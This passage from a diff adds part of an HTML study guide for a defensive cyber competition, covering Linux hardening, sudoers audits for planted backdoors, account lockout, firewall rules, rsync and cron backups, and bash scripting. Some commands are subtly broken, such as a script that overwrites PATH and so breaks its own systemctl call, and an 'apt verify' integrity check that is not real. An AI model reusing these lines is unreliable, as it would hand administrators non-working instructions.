+                    <li>Remove it or comment it out</li>
+                    <li>Check if similar code exists in other users' configurations</li>
+                    <li>Look for related persistence mechanisms</li>
+                </ol>
+                
+                <p><strong>Cron Jobs</strong></p>
+                <pre># Check for unauthorized scheduled tasks
+sudo su -
+ls -la /var/spool/cron/crontabs/
+cat /etc/crontab
+ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/</pre>
+            </section>
+
+            <section id="service-specific-hardening">
+                <h4>Service-Specific Hardening</h4>
+                <pre># Audit running services
+systemctl list-units --type=service --state=running
+
+# Check logs for specific service
+journalctl -u apache2
+
+# Disable unnecessary services
+systemctl disable [service]
+systemctl stop [service]</pre>
+            </section>
+
+            <section id="sudo-configuration">
+                <h4>Sudo Configuration</h4>
+                <pre># Safely edit sudoers file
+visudo
+
+# Enable sudo logging
+# Add to sudoers: Defaults logfile="/var/log/sudo.log"</pre>
+
+                <p><strong>Identifying and Fixing Insecure Sudo Configurations</strong></p>
+                <p>One critical security risk is overly permissive sudo configurations. Check for these dangerous patterns:</p>
+                <pre># Check the sudoers file for dangerous configurations
+sudo cat /etc/sudoers | grep -i "ALL=(ALL"
+sudo cat /etc/sudoers.d/* | grep -i "ALL=(ALL" 2>/dev/null</pre>
+
+                <p>Be especially cautious of these configurations:</p>
+                <ul>
+                    <li><code>username ALL=(ALL:ALL) ALL</code> - User can run any command as any user from any host</li>
+                    <li><code>username ALL=(ALL:ALL) NOPASSWD: ALL</code> - Same as above, but without password verification</li>
+                    <li><code>%groupname ALL=(ALL:ALL) ALL</code> - All users in a group have unlimited sudo privileges</li>
+                </ul>
+
+                <p>These configurations are dangerous because:</p>
+                <ul>
+                    <li>They allow privilege escalation for compromised accounts</li>
+                    <li>Red teams often add these as backdoors during competitions</li>
+                    <li>They bypass proper security controls and accountability</li>
+                    <li>They can negatively impact your scoring in the competition</li>
+                </ul>
+
+                <p>To fix overly permissive sudo configurations:</p>
+                <pre># Safely edit the sudoers file
+sudo visudo
+
+# Or edit a specific file in sudoers.d
+sudo visudo -f /etc/sudoers.d/filename</pre>
+
+                <p>Replace overly broad permissions with specific, limited ones:</p>
+                <pre># Instead of this (too permissive):
+username ALL=(ALL:ALL) NOPASSWD: ALL
+
+# Use this (limited to specific commands):
+username ALL=(root) PASSWD: /bin/systemctl restart apache2, /bin/systemctl status apache2</pre>
+
+                <p>After making changes, verify sudo still functions correctly for authorized users:</p>
+                <pre>sudo -l</pre>
+
+                <p>Monitor sudo usage to detect unauthorized privilege escalation:</p>
+                <pre>sudo journalctl -u sudo --since "1 hour ago"</pre>
+            </section>
+
+            <section id="user-security">
+                <h4>User Account Security</h4>
+                <p><strong>Privilege Review</strong></p>
+                <pre># Check group memberships
+groups [username]
+
+# Audit user privileges
+id [username]</pre>
+                <p><strong>SSH Hardening</strong></p>
+                <pre># Check for unauthorized SSH keys
+cat ~/.ssh/authorized_keys
+
+# Lock user accounts
+passwd -l [username]
+
+# Remove shell access
+usermod -s /usr/sbin/nologin [username]
+
+# Review login history
+lastlog
+last</pre>
+
+                <p><strong>Locking Out Unauthorized Users</strong></p>
+                <p>During competitions, you may discover unauthorized user accounts or need to secure non-essential accounts. The <code>passwd -l</code> command is a powerful tool for this purpose.</p>
+                
+                <pre># Lock a user account (prevents password-based login)
+sudo passwd -l username
+
+# Check if an account is locked
+sudo passwd -S username
+# Look for "L" in the output which indicates locked
+
+# To unlock a user account if needed
+sudo passwd -u username</pre>
+
+                <p>What locking a user account does:</p>
+                <ul>
+                    <li>Prepends the encrypted password with an exclamation mark (!), preventing password authentication</li>
+                    <li>Prevents the user from logging in via password-based methods</li>
+                    <li>Does NOT expire the password; it just prevents its use</li>
+                    <li>Does NOT disable the account entirely - key-based SSH can still work</li>
+                </ul>
+                
+                <p class="note">Note: For complete account deactivation, combine with other methods:</p>
+                <pre># Change the user's shell to nologin
+sudo usermod -s /usr/sbin/nologin username
+
+# Remove or comment out SSH keys in authorized_keys files
+sudo nano /home/username/.ssh/authorized_keys
+
+# Expire the account
+sudo usermod -e 1 username</pre>
+
+                <p>When locking accounts during a competition:</p>
+                <ol>
+                    <li>First identify all users on the system:</li>
+                    <pre>cat /etc/passwd | grep -v nologin | grep -v false</pre>
+                    <li>Determine which accounts are required for scoring</li>
+                    <li>Make sure any account you lock is not being used by the scoring engine</li>
+                    <li>Document all actions taken on user accounts</li>
+                </ol>
+            </section>
+
+            <section id="scoring-bot-protection">
+                <h4>Distinguishing Scoring Bot vs. Red Team</h4>
+                <p><strong>Analyzing SSH Keys</strong></p>
+                <pre># Check authorized keys for all users
+cat ~/.ssh/authorized_keys
+
+# Get fingerprints of suspicious keys
+ssh-keygen -lf /path/to/key.pub
+
+# Compare all authorized keys' fingerprints
+for key in ~/.ssh/authorized_keys; do ssh-keygen -lf $key; done</pre>
+                <p><strong>Monitoring SSH Sessions</strong></p>
+                <pre># Check currently logged-in users
+who
+w
+last -a | grep "still running"
+netstat -tnpa | grep 'sshd'</pre>
+                <p><strong>Analyzing SSH Logs</strong></p>
+                <pre># Review SSH access logs
+sudo journalctl -u ssh --since "1 hour ago"
+sudo grep "Accepted publickey" /var/log/auth.log</pre>
+            </section>
+
+            <section id="intruder-detection">
+                <h4>Detecting and Removing Intruders</h4>
+                <p><strong>Process Monitoring</strong></p>
+                <pre># See currently logged-in users
+who -a
+
+# Check for suspicious processes
+ps aux | grep -v "^$(whoami)"
+ps auxf
+top</pre>
+                <p><strong>Network Connections</strong></p>
+                <pre># Find all network connections with PIDs
+netstat -plant
+
+# Terminate suspicious connections
+kill [PID]
+kill -9 [PID]</pre>
+                <p><strong>Continuous Network Monitoring</strong></p>
+                <pre># Monitor connections every 10 seconds
+sudo su -
+watch -n 10 "netstat -plant"
+
+# Log connections
+watch -n 10 "netstat -plant | tee -a /var/log/connections.log"</pre>
+            </section>
+
+            <section id="firewall-ip-blocking">
+                <h4>Firewall Configuration and IP Blocking</h4>
+                <p class="warning">IMPORTANT: Before blocking any IPs, ensure you identify and whitelist the scoring bot's IP address. Blocking the scoring bot will result in losing points in the competition.</p>
+
+                <p><strong>Using iptables (basic firewall)</strong></p>
+                <pre># Whitelist the scoring bot IP first
+sudo iptables -A INPUT -s [SCORING_BOT_IP] -j ACCEPT
+
+# Block a specific malicious IP address
+sudo iptables -A INPUT -s 192.168.1.100 -j DROP
+
+# Block an entire subnet
+sudo iptables -A INPUT -s 192.168.1.0/24 -j DROP
+
+# Save rules (Debian/Ubuntu)
+sudo netfilter-persistent save</pre>
+
+                <p><strong>Using ufw (Uncomplicated Firewall)</strong></p>
+                <pre># Enable ufw
+sudo ufw enable
+
+# Allow the scoring bot IP
+sudo ufw allow from [SCORING_BOT_IP] to any
+
+# Block a specific IP address
+sudo ufw deny from 192.168.1.100 to any</pre>
+
+                <p><strong>Default Deny Policy with IPTables</strong></p>
+                <pre># Implement default deny policy
+iptables -P INPUT DROP
+iptables -P FORWARD DROP
+iptables -P OUTPUT ACCEPT
+
+# Allow essential services
+iptables -A INPUT -i lo -j ACCEPT
+iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
+iptables -A INPUT -p tcp --dport 22 -j ACCEPT  # SSH
+iptables -A INPUT -p tcp --dport 80 -j ACCEPT  # HTTP</pre>
+            </section>
+
+            <section id="additional-security">
+                <h4>Additional Security Measures</h4>
+                <pre># Check for unauthorized SUID/SGID binaries
+find / -type f -perm /4000 -o -perm /2000 -ls 2>/dev/null
+
+# Look for world-writable files
+find / -type f -perm -o+w -ls 2>/dev/null
+
+# Verify package integrity (Debian/Ubuntu)
+apt verify
+
+# Monitor logs continuously
+tail -f /var/log/auth.log /var/log/syslog</pre>
+            </section>
+        </section>
+    </section>
+
+    <hr>
+
+    <section id="backup-and-recovery">
+        <h2>Backup and Recovery</h2>
+
+        <section id="using-rsync">
+            <h3>Using RSync</h3>
+            
+            <section id="basic-rsync-command">
+                <h4>Basic RSync Command Syntax</h4>
+                <p>The rsync utility provides efficient file synchronization and backup capabilities:</p>
+                <p>Basic syntax: <code>rsync [options] source destination</code></p>
+                <p>Common options:</p>
+                <ul>
+                    <li><code>-a</code>: Archive mode (preserves permissions, ownership, timestamps)</li>
+                    <li><code>-v</code>: Verbose output showing what files are being transferred</li>
+                    <li><code>--delete</code>: Ensures destination matches source by removing files not in source</li>
+                </ul>
+                <p>Example:</p>
+                <pre>rsync -av stuff/ backups/</pre>
+            </section>
+            
+            <section id="incremental-backups">
+                <h4>Incremental Backups</h4>
+                <p>rsync only transfers files that have changed since the last backup:</p>
+                <ul>
+                    <li>Detects changes based on file size, modification time, and contents</li>
+                    <li>More efficient than manual copies for large data sets</li>
+                </ul>
+                <p>Example of how it works:</p>
+                <pre># First backup transfers all files
+rsync -av stuff/ backups/
+
+# Second backup only transfers changed files
+# (After modifying "practice1")
+rsync -av stuff/ backups/</pre>
+                
+                <p>Maintaining Consistency with --delete</p>
+                <p>The --delete option ensures destination exactly matches source:</p>
+                <ul>
+                    <li>Removes files from destination that no longer exist in source</li>
+                    <li>Example: <code>rsync -av --delete stuff/ backups/</code></li>
+                </ul>
+                <p>Trade-offs:</p>
+                <ul>
+                    <li>Advantage: Perfect mirror of source</li>
+                    <li>Disadvantage: Accidentally deleted files will also be removed from backup</li>
+                </ul>
+            </section>
+            
+            <section id="remote-backups">
+                <h4>Remote Backups Using SSH</h4>
+                <p>Transfer files securely between machines over a network:</p>
+                <pre>rsync -av -e ssh source user@remote_host:/path/to/destination</pre>
+                <p>Example:</p>
+                <pre>rsync -av -e ssh stuff/ sandbox@192.168.195.100:/home/sandbox/backups_website/</pre>
+                <p>Requires SSH server running on the remote host</p>
+            </section>
+            
+            <section id="rsync-options">
+                <h4>RSync Command Options</h4>
+                <ul>
+                    <li><code>-a</code>: Archive mode (combination of -rlptgoD)</li>
+                    <li><code>-v</code>: Verbose output</li>
+                    <li><code>-r</code>: Recursive (include subdirectories)</li>
+                    <li><code>-z</code>: Compress data during transfer</li>
+                    <li><code>-e</code>: Specify remote shell to use</li>
+                    <li><code>--delete</code>: Remove extraneous files from destination</li>
+                    <li><code>--exclude</code>: Exclude files matching pattern</li>
+                    <li><code>--include</code>: Don't exclude files matching pattern</li>
+                </ul>
+            </section>
+        </section>
+
+        <section id="automated-backups">
+            <h3>Automated Backups</h3>
+            
+            <section id="backup-schedules">
+                <h4>Setting Up Backup Schedules</h4>
+                <p>Use cron jobs to automate backups at regular intervals:</p>
+                <ul>
+                    <li>Consider what to back up (configuration files, user data, important directories)</li>
+                    <li>Determine appropriate backup frequency based on data change rate</li>
+                    <li>Ensure backup locations have sufficient space</li>
+                </ul>
+            </section>
+            
+            <section id="secure-remote-backups">
+                <h4>Secure Remote Backups</h4>
+                <p>Best practices for secure remote backups:</p>
+                <ul>
+                    <li>Set up SSH keys for passwordless authentication</li>
+                    <li>Create dedicated backup directories on remote systems</li>
+                    <li>Protect SSH keys with appropriate permissions (600 for private keys)</li>
+                    <li>Network considerations: firewall rules, bandwidth limitations</li>
+                </ul>
+                <p>Example command for secure remote backup:</p>
+                <pre>rsync -av -e "ssh -i /root/backup_keys" /home/sandbox/desktop/stuff/ sandbox@192.168.195.100:/home/sandbox/backups_website/</pre>
+            </section>
+            
+            <section id="key-based-authentication">
+                <h4>Key-Based Authentication for Automated Backups</h4>
+                <p>Generate key pair for automated backups:</p>
+                <pre>ssh-keygen -t ecdsa -f backup_keys</pre>
+                <p>Set appropriate permissions and ownership:</p>
+                <pre>sudo chown root:root backup_keys
+sudo chmod 600 backup_keys
+sudo mv backup_keys /root/</pre>
+                <p>Copy public key to remote server:</p>
+                <pre>scp backup_keys.pub sandbox@192.168.195.100:/home/sandbox/</pre>
+                <p>Set up authorized_keys on remote server:</p>
+                <pre>mkdir -p ~/.ssh
+mv backup_keys.pub ~/.ssh/authorized_keys
+chmod 600 ~/.ssh/authorized_keys</pre>
+            </section>
+        </section>
+
+        <section id="cron-jobs">
+            <h3>Cron Jobs</h3>
+            
+            <section id="user-specific-crontabs">
+                <h4>User-Specific Crontabs</h4>
+                <ul>
+                    <li>Access with: <code>crontab -e</code></li>
+                    <li>Located in: <code>/var/spool/cron/crontabs/username</code></li>
+                    <li>Executed with user's permissions</li>
+                    <li>Only run when user is in system (not necessarily logged in)</li>
+                </ul>
+                <p>Example setting up a user crontab:</p>
+                <pre># Run backup every minute
+* * * * * rsync -av /home/sandbox/desktop/stuff/ /home/sandbox/desktop/backups/</pre>
+            </section>
+            
+            <section id="system-wide-crontabs">
+                <h4>System-Wide Crontabs</h4>
+                <ul>
+                    <li>Located in: <code>/etc/crontab</code></li>
+                    <li>Require root access to modify</li>
+                    <li>Include username field to specify execution context</li>
+                </ul>
+                <p>Example system-wide crontab entry:</p>
+                <pre># Backup every minute as root user
+* * * * * root rsync -av /home/sandbox/desktop/stuff/ /home/sandbox/desktop/backups/</pre>
+                <p>Additional system cron directories:</p>
+                <ul>
+                    <li><code>/etc/cron.d/</code>: Contains additional system crontab files</li>
+                    <li><code>/etc/cron.daily/</code>, <code>/etc/cron.hourly/</code>, etc.: For scripts to run at specific intervals</li>
+                </ul>
+            </section>
+            
+            <section id="crontab-syntax">
+                <h4>Crontab Syntax and Scheduling</h4>
+                <p>Five time fields in order:</p>
+                <ol>
+                    <li>Minute (0-59)</li>
+                    <li>Hour (0-23)</li>
+                    <li>Day of month (1-31)</li>
+                    <li>Month (1-12)</li>
+                    <li>Day of week (0-7, where 0 and 7 are Sunday)</li>
+                </ol>
+                <p>Asterisk (*) means "every" for that field</p>
+                <p>Common patterns:</p>
+                <ul>
+                    <li><code>* * * * *</code>: Every minute</li>
+                    <li><code>0 * * * *</code>: Every hour at minute 0</li>
+                    <li><code>0 0 * * *</code>: Once daily at midnight</li>
+                    <li><code>0 0 * * 0</code>: Once weekly on Sunday at midnight</li>
+                </ul>
+            </section>
+            
+            <section id="cron-security">
+                <h4>Security Considerations for Automated Tasks</h4>
+                <ul>
+                    <li>Avoid embedding passwords in cron jobs</li>
+                    <li>Use key-based authentication for SSH/SCP/rsync</li>
+                    <li>Check permissions on script files and key files</li>
+                    <li>Consider who owns cron jobs and what permissions they run with</li>
+                    <li>Restrict access to output files</li>
+                </ul>
+                <p>Monitor for unauthorized cron jobs:</p>
+                <pre>sudo ls -la /var/spool/cron/crontabs/
+sudo ls -la /etc/cron.d/</pre>
+            </section>
+            
+            <section id="managing-cron-jobs">
+                <h4>Managing and Monitoring Cron Jobs</h4>
+                <p>Common cron management commands:</p>
+                <ul>
+                    <li>List existing cron jobs: <code>crontab -l</code></li>
+                    <li>Edit cron jobs: <code>crontab -e</code></li>
+                    <li>Remove all cron jobs: <code>crontab -r</code></li>
+                    <li>View cron logs: <code>grep CRON /var/log/syslog</code></li>
+                    <li>Check running cron processes: <code>ps aux | grep cron</code></li>
+                </ul>
+            </section>
+        </section>
+    </section>
+
+    <hr>
+
+    <section id="bash-scripting">
+        <h2>Bash Scripting</h2>
+        
+        <section id="basic-script-creation">
+            <h3>Basic Script Creation</h3>
+            
+            <section id="first-script">
+                <h4>Creating Your First Script</h4>
+                <ol>
+                    <li>Create a file with .sh extension: <code>touch my_first_script.sh</code></li>
+                    <li>Open in text editor: <code>nano my_first_script.sh</code></li>
+                    <li>Write your commands in the file</li>
+                    <li>Make script executable: <code>chmod 755 my_first_script.sh</code></li>
+                    <li>Run script: <code>./my_first_script.sh</code></li>
+                </ol>
+            </section>
+            
+            <section id="shebang-line">
+                <h4>Shebang Line</h4>
+                <p>First line of script specifies interpreter:</p>
+                <ul>
+                    <li><code>#!/bin/bash</code> - Use bash shell</li>
+                    <li><code>#!/bin/sh</code> - Use system default shell</li>
+                </ul>
+                <p>Example:</p>
+                <pre>#!/bin/bash
+echo "Hello World"</pre>
+            </section>
+            
+            <section id="script-execution">
+                <h4>Script Execution Methods</h4>
+                <p>Direct execution with path:</p>
+                <ul>
+                    <li><code>./my_first_script.sh</code> (relative path)</li>
+                    <li><code>/home/sandbox/my_first_script.sh</code> (absolute path)</li>
+                </ul>
+                <p>Execute via interpreter:</p>
+                <pre>bash my_first_script.sh</pre>
+                <p>Source the script (runs in current shell):</p>
+                <pre>source my_first_script.sh
+. my_first_script.sh</pre>
+            </section>
+        </section>
+        
+        <section id="variables-and-input">
+            <h3>Variables and Input</h3>
+            
+            <section id="variable-assignment">
+                <h4>Variable Assignment and Usage</h4>
+                <ul>
+                    <li>Assign values with equals sign (no spaces): <code>MSG="Hello World!"</code></li>
+                    <li>Access variables with dollar sign: <code>echo $MSG</code></li>
+                    <li>Variables in quoted strings: <code>echo "This script says: $MSG"</code></li>
+                </ul>
+                <p>Example:</p>
+                <pre>#!/bin/bash
+MSG="Hello World!"
+echo "This script says: $MSG"</pre>
+            </section>
+            
+            <section id="reading-user-input">
+                <h4>Reading User Input</h4>
+                <p>Use read command to get input:</p>
+                <ul>
+                    <li><code>-p</code>: Display prompt</li>
+                    <li><code>-s</code>: Silent mode (for passwords)</li>
+                </ul>
+                <p>Example:</p>
+                <pre>#!/bin/bash
+read -p "Enter your second message: " MSG2
+echo "Your second message was: $MSG2"</pre>
+            </section>
+            
+            <section id="command-substitution">
+                <h4>Command Substitution</h4>
+                <ul>
+                    <li>Capture command output in variables: <code>CURRENT_DIR=$(pwd)</code></li>
+                    <li>Alternative syntax: <code>CURRENT_DIR=`pwd`</code></li>
+                    <li>Use in strings: <code>echo "You are in $CURRENT_DIR"</code></li>
+                </ul>
+                <p>Example:</p>
+                <pre>#!/bin/bash
+DATE=$(date)
+echo "Current date and time is: $DATE"</pre>
+            </section>
+        </section>
+        
+        <section id="file-operations">
+            <h3>File Operations</h3>
+            
+            <section id="file-paths">
+                <h4>File Paths in Scripts</h4>
+                <ul>
+                    <li>Relative paths: Based on current working directory</li>
+                    <li>Absolute paths: Full path from root directory</li>
+                    <li>Special paths:
+                        <ul>
+                            <li><code>.</code>: Current directory</li>
+                            <li><code>..</code>: Parent directory</li>
+                            <li><code>~</code>: Home directory</li>
+                        </ul>
+                    </li>
+                </ul>
+                <p>Working with script's directory:</p>
+                <pre>SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"</pre>
+            </section>
+            
+            <section id="reading-writing-files">
+                <h4>Reading and Writing Files</h4>
+                <p>Read file content:</p>
+                <pre>content=$(cat file.txt)
+echo "The file contains: $content"</pre>
+                <p>Write to file:</p>
+                <pre>echo "New content" > file.txt  # Overwrite
+echo "Additional content" >> file.txt  # Append</pre>
+                <p>Redirect command output to file:</p>
+                <pre>ls -la > directory_listing.txt</pre>
+            </section>
+            
+            <section id="redirecting-output">
+                <h4>Redirecting Output</h4>
+                <ul>
+                    <li>Redirect stdout to file: <code>command > file</code></li>
+                    <li>Append stdout to file: <code>command >> file</code></li>
+                    <li>Redirect stderr to file: <code>command 2> errors.log</code></li>
+                    <li>Redirect both stdout and stderr: <code>command &> all_output.log</code></li>
+                </ul>
+                <p>Using the tee command with sudo:</p>
+                <pre>echo "Content" | sudo tee file.txt > /dev/null</pre>
+                <p>Examples:</p>
+                <pre># Write to file owned by root using tee
+echo "Content" | sudo tee /etc/some_config_file > /dev/null
+
+# Save command output to file while also displaying it
+command | tee output.log</pre>
+            </section>
+        </section>
+        
+        <section id="script-permissions">
+            <h3>Script Permissions</h3>
+            
+            <section id="execute-permissions">
+                <h4>Setting Execute Permissions</h4>
+                <ul>
+                    <li>Basic chmod: <code>chmod +x script.sh</code></li>
+                    <li>Numeric chmod: <code>chmod 755 script.sh</code></li>
+                    <li>Owner only: <code>chmod 700 script.sh</code></li>
+                </ul>
+                <p>File permission meanings:</p>
+                <ul>
+                    <li><code>755</code>: Owner can read/write/execute; others can read/execute</li>
+                    <li><code>700</code>: Owner can read/write/execute; others have no permissions</li>
+                    <li><code>644</code>: Owner can read/write; others can read only</li>
+                </ul>
+            </section>
+            
+            <section id="ownership">
+                <h4>Understanding Ownership</h4>
+                <ul>
+                    <li>Check file ownership: <code>ls -l script.sh</code></li>
+                    <li>Change owner: <code>sudo chown user:group script.sh</code></li>
+                    <li>Running scripts as different users: <code>sudo -u username ./script.sh</code></li>
+                    <li>Impact of ownership on script execution</li>
+                    <li>Importance of proper file permissions</li>
+                </ul>
+            </section>
+            
+            <section id="sudo-scripts">
+                <h4>Running Scripts with Sudo</h4>
+                <ul>
+                    <li>Run with elevated privileges: <code>sudo ./script.sh</code></li>
+                    <li>Sudo permission considerations</li>
+                </ul>
+                <p>Handling redirection with sudo:</p>
+                <pre># This won't work with redirects
+sudo echo "content" > /etc/file.txt
+
+# This will work
+echo "content" | sudo tee /etc/file.txt</pre>
+                <p>Sudo in scripts:</p>
+                <ul>
+                    <li>Don't embed sudo in scripts</li>
+                    <li>Run entire script with sudo instead</li>
+                </ul>
+            </section>
+        </section>
+        
+        <section id="automating-tasks">
+            <h3>Automating Tasks</h3>
+            
+            <section id="network-configuration-scripts">
+                <h4>Network Configuration Scripts</h4>
+                <p>Scripts to configure interfaces:</p>
+                <pre>#!/bin/bash
+# Example network configuration script
+PATH="/etc/network/interfaces"
+read -p "Please enter the desired IP: " IP
+read -p "Please enter the desired mask: " MASK
+
+echo "auto lo" > $PATH
+echo "iface lo inet loopback" >> $PATH
+echo "" >> $PATH
+echo "auto eth0" >> $PATH
+echo "iface eth0 inet static" >> $PATH
+echo "    address $IP" >> $PATH
+echo "    netmask $MASK" >> $PATH
+
+systemctl restart networking
+ip a</pre>
+            </section>
+            
+            <section id="service-management-scripts">
+                <h4>Service Management Scripts</h4>
+                <p>Example service restart script:</p>
+                <pre>#!/bin/bash
+SERVICE="apache2"
+
+echo "Checking $SERVICE status..."
+systemctl status $SERVICE
+
+read -p "Do you want to restart $SERVICE? (y/n): " ANSWER
+if [[ "$ANSWER" == "y" ]]; then
+    echo "Restarting $SERVICE..."
+    sudo systemctl restart $SERVICE
+    echo "Done. New status:"
+    systemctl status $SERVICE
+else
+    echo "Operation cancelled."
+fi</pre>
+            </section>
+            
+            <section id="regex-processing">
+                <h4>Regular Expression Processing</h4>
+                <p>Using grep, sed, and awk in scripts:</p>
+                <pre>#!/bin/bash
+# Extract all IP addresses from a log file
+grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" /var/log/auth.log</pre>
+            </section>
+            
+            <section id="error-handling">
+                <h4>Error Handling in Scripts</h4>
+                <p>Check return codes:</p>
+                <pre>if [ $? -ne 0 ]; then echo "Error"; fi</pre>
+                <p>Set to exit on error:</p>
+                <pre>set -e</pre>
+                <p>Custom error handling:</p>
+                <pre>#!/bin/bash
+# Error handling function
+error_exit() {
+    echo "$1" 1>&2
+    exit 1
+}
+
+# Use error handling
+command || error_exit "Command failed"</pre>
+            </section>
+        </section>
+    </section>
+
+    <hr>
+
+    <section id="competition-strategies">
+        <h2>Competition Strategies</h2>
+        
+        <section id="initial-assessment">
+            <h3>Initial Assessment</h3>
+            
+            <section id="network-topology">
+                <h4>Network Topology Understanding</h4>
+                <ul>
+                    <li>Identify all devices in your network</li>
+                    <li>Document IP address ranges and team number</li>
+                    <li>Map connections between devices</li>
+                </ul>
+                <p>Check network connectivity:</p>
+                <pre>ping 192.168.X.1  # Test router connectivity
+traceroute 172.20.0.1  # Trace path to scoring server
+ip route  # Check routing table</pre>
+                <p>Document findings for team reference</p>
+            </section>
+            
+            <section id="service-identification">
+                <h4>Service Identification</h4>
+                <p>Check running services on all machines:</p>
+                <pre>sudo systemctl list-units --type=service --state=running
+sudo netstat -tulpn
+ps aux | grep -i 'apache\|ssh\|dns\|named'</pre>
+                <ul>
+                    <li>Identify services that need to be configured for scoring</li>
+                    <li>Document service requirements from competition instructions</li>
+                    <li>Check default configurations for key services</li>
+                </ul>
+            </section>
+            
+            <section id="team-assignment">
+                <h4>Team Number and Theme Assignment</h4>
+                <ul>
+                    <li>Incorporate team number into all configurations</li>
+                    <li>Check scoring dashboard for team-specific requirements</li>
+                    <li>Apply team information to required services</li>
+                    <li>Update web content to include team information</li>
+                    <li>Test service accessibility from scoring perspective</li>
+                </ul>
+            </section>
+        </section>
+        
+        <section id="securing-services">
+            <h3>Securing Services</h3>
+            
+            <section id="service-prioritization">
+                <h4>Service Prioritization</h4>
+                <p>Order of operations:</p>
+                <ol>
+                    <li>Configure required services for scoring</li>
+                    <li>Apply basic security hardening</li>
+                    <li>Secure user accounts</li>
+                    <li>Implement firewall rules</li>
+                    <li>Set up monitoring</li>
+                    <li>Create backup solutions</li>
+                </ol>
+            </section>
+            
+            <section id="configuration-backups">
+                <h4>Configuration Backups</h4>
+                <p>Example backup script:</p>
+                <pre>#!/bin/bash
+# Backup key configuration files
+BACKUP_DIR="/home/sandbox/config_backups"
+mkdir -p $BACKUP_DIR/$(date +%Y%m%d_%H%M%S)
+cp /etc/apache2/apache2.conf $BACKUP_DIR/$(date +%Y%m%d_%H%M%S)/
+cp /etc/ssh/sshd_config $BACKUP_DIR/$(date +%Y%m%d_%H%M%S)/
+cp /etc/bind/named.conf* $BACKUP_DIR/$(date +%Y%m%d_%H%M%S)/</pre>
+                <ul>
+                    <li>Use rsync for automated backups to another machine</li>
+                    <li>Set up periodic configuration snapshots with cron</li>
+                </ul>
+            </section>
+            
+            <section id="scoring-requirements">
+                <h4>Scoring Service Requirements</h4>
+                <ul>
+                    <li>Ensure content on web pages matches team number</li>
+                    <li>Verify services are accessible from scoring network</li>
+                    <li>Implement required port forwarding rules</li>
+                    <li>Test service functionality from external perspective</li>
+                    <li>Document successful tests for reference</li>
+                </ul>
+            </section>
+        </section>
+        
+        <section id="router-specific-considerations">
+            <h3>Router-Specific Considerations</h3>
+            
+            <section id="port-forwarding-protocols">
+                <h4>Port Forwarding Protocols (TCP vs UDP)</h4>
+                <p>Remember different services use different protocols:</p>
+                <ul>
+                    <li>HTTP/HTTPS: TCP</li>
+                    <li>SSH: TCP</li>
+                    <li>DNS: Primarily UDP (but sometimes TCP)</li>
+                </ul>
+                <p>Common mistake: Forwarding TCP for UDP services</p>
+                <p>Example correct port forwarding for DNS:</p>
+                <pre>sudo firewall-cmd --zone=external --permanent --add-forward-port=port=53:proto=udp:toport=53:toaddr=192.168.X.2</pre>
+                <p>Always verify protocols before implementing forwarding rules</p>
+            </section>
+            
+            <section id="firewall-zones">
+                <h4>Firewall Zone Configuration</h4>
+                <p>Understand MikroTik/firewalld zone concepts:</p>
+                <ul>
+                    <li>external: Internet-facing interfaces</li>
+                    <li>internal: Local network interfaces</li>
+                </ul>
+                <ul>
+                    <li>Configure appropriate services for each zone</li>
+                    <li>Apply masquerading to external zones for NAT</li>
+                    <li>Make zone assignments explicit in interface configurations</li>
+                </ul>
+                <p>Reload after changes:</p>
+                <pre>sudo firewall-cmd --reload</pre>
+            </section>
+            
+            <section id="service-vs-forward">
+                <h4>Service vs Port Forward Understanding</h4>
+                <p>Key distinction:</p>
+                <ul>
+                    <li>Service: Allows direct connection to router itself</li>
+                    <li>Port Forward: Redirects traffic to internal server</li>
+                </ul>
+                <p>Common mistake: Allowing a service when you need a port forward</p>
+                <p>Example testing service accessibility:</p>
+                <pre># Test SSH to router itself
+ssh sandbox@172.20.X.1
+
+# Test port forwarded SSH
+ssh sandbox@172.20.X.1  # Should now reach internal server</pre>
+                <p>Configure appropriate security for each case</p>
+            </section>
+        </section>
+        
+        <section id="monitoring-for-attacks">
+            <h3>Monitoring for Attacks</h3>
+            
+            <section id="connection-monitoring">
+                <h4>Connection Monitoring</h4>
+                <p>Monitor active network connections:</p>
+                <pre>watch -n 5 ss -plant</pre>
+                <p>Track logged-in users:</p>
+                <pre>watch -n 10 "w"</pre>
+                <p>Identify unusual process activity:</p>
+                <pre>ps auxf
+top</pre>
+                <p>Create a monitoring script:</p>
+                <pre>#!/bin/bash
+# Save this to monitor.sh and run with: watch -n 10 "./monitor.sh"
+echo "=== Active SSH Connections ==="
+ss -plant | grep ":22" | grep ESTAB
+
+echo -e "\n=== Logged in Users ==="
+w
+
+echo -e "\n=== Last Login Attempts ==="
+tail -5 /var/log/auth.log | grep "sshd"</pre>
+            </section>
+            
+            <section id="log-analysis">
+                <h4>Log Analysis</h4>
+                <p>Key logs to monitor:</p>
+                <ul>
+                    <li><code>/var/log/auth.log</code>: Authentication attempts</li>
+                    <li><code>/var/log/apache2/access.log</code>: Web server access</li>
+                    <li><code>/var/log/syslog</code>: System messages</li>
+                </ul>
+                <p>Real-time log monitoring:</p>
+                <pre>sudo tail -f /var/log/auth.log</pre>
+                <p>Look for patterns of attack in logs:</p>
+                <pre>grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -nr</pre>
+            </section>
+            
+            <section id="malicious-activity">
+                <h4>Identifying Malicious Activity</h4>
+                <p>Watch for:</p>
+                <ul>
+                    <li>Failed login attempts from unusual IPs</li>
+                    <li>Unexpected open ports: <code>netstat -tuln</code></li>
+                    <li>Unusual processes: <code>ps aux | grep -v "^$(whoami)\|^root"</code></li>
+                    <li>Unexpected cron jobs: <code>ls -la /var/spool/cron/crontabs/</code></li>
+                    <li>Modified configuration files</li>
+                </ul>
+                <p>Create an alert for suspicious activity:</p>
+                <pre>#!/bin/bash
+# Monitor for suspicious login attempts
+grep "Failed password" /var/log/auth.log | tail -n 20 > /tmp/recent_fails
+if [ $(wc -l < /tmp/recent_fails) -gt 10 ]; then
+    echo "ALERT: High number of failed login attempts!"
+    cat /tmp/recent_fails
+fi</pre>
+            </section>
+            
+            <section id="scoring-bot-vs-red-team">
+                <h4>Distinguishing Scoring Bot vs. Red Team Activity</h4>
+                <p>Being able to accurately distinguish between legitimate scoring bot activity and malicious red team attacks is crucial for maintaining points while defending against threats.</p>
+                
+                <p><strong>Scoring Bot Behavior Patterns:</strong></p>
+                <ul>
